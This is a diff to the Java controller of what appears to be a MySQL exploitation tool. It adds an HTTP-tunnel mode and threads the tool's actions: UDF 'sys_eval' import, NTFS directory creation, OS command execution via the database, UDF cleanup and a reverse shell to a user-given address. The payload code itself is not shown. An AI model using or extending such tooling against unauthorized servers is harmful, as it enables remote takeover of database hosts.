@@ -1,6 +1,7 @@
 package Controller;
 
 import Dao.MysqlDao;
+import Dao.MysqlHttpDao;
 import Entity.ControllersFactory;
 import Util.Utils;
 import Util.MessageUtil;
@@ -41,7 +42,7 @@ public class MysqlController implements Initializable {
     private TextField reversePortTextField;
 
     @FXML
-    private Button mysqlclearn;
+    private Button mysqlclean;
 
     @FXML
     private TextArea mysqloutput;
@@ -62,6 +63,8 @@ public class MysqlController implements Initializable {
      * 存储从 MysqlDao 传递过来的 mysqlDao 使用
      */
     private MysqlDao mysqlDao;
+
+    private MysqlHttpDao mysqlHttpDao;
 
     private JSONObject dataObj;
 
@@ -91,23 +94,34 @@ public class MysqlController implements Initializable {
         // 尝试连接
         Runnable runner = () -> {
             try {
-                this.mysqlDao = new MysqlDao(this.dataObj.getString("ipaddress"), this.dataObj.getString("port"),
-                         this.dataObj.getString("database"), this.dataObj.getString("username"), this.dataObj.getString("password"), this.dataObj.getString("timeout"));
-                this.mysqlDao.getConnection();
-                Platform.runLater(() -> {
-                    mysqlLogTextArea.appendText(Utils.log("连接成功！"));
-                    // 获取信息输出
-                    this.mysqlDao.getInfo();
-                });
+                if("false".equals(this.dataObj.getString("ishttp"))){
+                    this.mysqlDao = new MysqlDao(this.dataObj.getString("ipaddress"), this.dataObj.getString("port"),
+                            this.dataObj.getString("database"), this.dataObj.getString("username"), this.dataObj.getString("password"), this.dataObj.getString("timeout"));
+                    this.mysqlDao.getConnection();
+                    Platform.runLater(() -> {
+                        mysqlLogTextArea.appendText(Utils.log("连接成功！"));
+                        // 获取信息输出
+                        this.mysqlDao.getInfo();
+                    });
+                }else {
+                    Platform.runLater(() -> {
+                        this.mysqlHttpDao = new MysqlHttpDao(this.dataObj);
+                        this.mysqlHttpDao.getConnection();
+                        this.mysqlHttpDao.getInfo();
+                    });
+                }
+
             } catch (Exception e) {
-                Platform.runLater(() -> {
-                    mysqlLogTextArea.appendText(Utils.log("连接失败！"));
-                    MessageUtil.showExceptionMessage(e, e.getMessage());
-                    try {
-                        this.mysqlDao.closeConnection();
-                    } catch (Exception ex) {
-                    }
-                });
+                if("false".equals(this.dataObj.getString("ishttp"))){
+                    Platform.runLater(() -> {
+                        mysqlLogTextArea.appendText(Utils.log("连接失败！"));
+                        MessageUtil.showExceptionMessage(e, e.getMessage());
+                        try {
+                            this.mysqlDao.closeConnection();
+                        } catch (Exception ex) {
+                        }
+                    });
+                }
             }
         };
         Thread workThrad = new Thread(runner);
@@ -119,50 +133,102 @@ public class MysqlController implements Initializable {
      * 下拉框初始化
      */
     public void initComboBox() {
-        ObservableList<String> OracleTypeCodeoptions = FXCollections.observableArrayList(
+        ObservableList<String> MysqlTypeCodeoptions = FXCollections.observableArrayList(
                 "UTF-8",
                 "GB2312",
                 "GBK"
         );
         // 初始化下拉框
-        MysqlEncode.setPromptText("UTF-8");
-        MysqlEncode.setItems(OracleTypeCodeoptions);
+        MysqlEncode.setValue("UTF-8");
+        MysqlEncode.setItems(MysqlTypeCodeoptions);
     }
 
     @FXML
     void mysqludf(ActionEvent event) {
-        this.mysqlDao.udf("sys_eval");
+        Runnable runner = () -> {
+            if("false".equals(this.dataObj.getString("ishttp"))){
+                this.mysqlDao.udf("sys_eval");
+            }else {
+                Platform.runLater(() -> {
+                    this.mysqlHttpDao.importUDF("sys_eval");
+                });
+            }
+        };
+        Thread workThrad = new Thread(runner);
+        workThrad.start();
+
+
     }
 
     @FXML
     void reverseRun(ActionEvent event) {
-        String reverseAddress = reverseAddressTextField.getText();
-        String reversePort = reversePortTextField.getText();
-        this.mysqlDao.reverseShell(reverseAddress, reversePort, "UTF-8");
+        Runnable runner = () -> {
+            String reverseAddress = reverseAddressTextField.getText();
+            String reversePort = reversePortTextField.getText();
+            if("false".equals(this.dataObj.getString("ishttp"))){
+                this.mysqlDao.reverseShell(reverseAddress, reversePort, "UTF-8");
+
+            }else {
+                this.mysqlHttpDao.reverseShell(reverseAddress, reversePort, "UTF-8");
+            }
+        };
+        Thread workThrad = new Thread(runner);
+        workThrad.start();
+
     }
 
     @FXML
     void mysqlntfs(ActionEvent event) {
-        this.mysqlDao.ntfsdir();
+        Runnable runner = () -> {
+            if("false".equals(this.dataObj.getString("ishttp"))){
+                this.mysqlDao.ntfsdir();
+            }else {
+                this.mysqlHttpDao.ntfsdir();
+            }
+        };
+        Thread workThrad = new Thread(runner);
+        workThrad.start();
+
+
     }
 
     @FXML
-    void mysqlclearn(ActionEvent event) {
-        this.mysqlDao.clearnudf();
+    void mysqlclean(ActionEvent event) {
+        Runnable runner = () -> {
+            if("false".equals(this.dataObj.getString("ishttp"))){
+                this.mysqlDao.cleanudf();
+            }else {
+                this.mysqlHttpDao.cleanudf();
+            }
+        };
+        Thread workThrad = new Thread(runner);
+        workThrad.start();
+
+
     }
 
     @FXML
     void mysqleval(ActionEvent event) {
-        String command = mysqlcommand.getText();
-        String code = MysqlEncode.getValue();
-        if (code == null) {
-            MessageUtil.showErrorMessage("错误", "请选择编码类型");
-            return;
-        }else if(command == null){
-            MessageUtil.showErrorMessage("错误", "请填写执行命令");
-            return;
-        }
-        String res = this.mysqlDao.eval(command, code);
-        mysqloutput.setText(res);
+        Runnable runner = () -> {
+            String command = mysqlcommand.getText();
+            String code = MysqlEncode.getValue();
+            String res = "";
+            if (code == null) {
+                MessageUtil.showErrorMessage( "请选择编码类型");
+                return;
+            }else if(command == null){
+                MessageUtil.showErrorMessage( "请填写执行命令");
+                return;
+            }
+            if("false".equals(this.dataObj.getString("ishttp"))){
+                res = this.mysqlDao.eval(command, code);
+            }else {
+                res = this.mysqlHttpDao.eval(command, code);
+            }
+            mysqloutput.setText(res);
+        };
+        Thread workThrad = new Thread(runner);
+        workThrad.start();
+
     }
 }
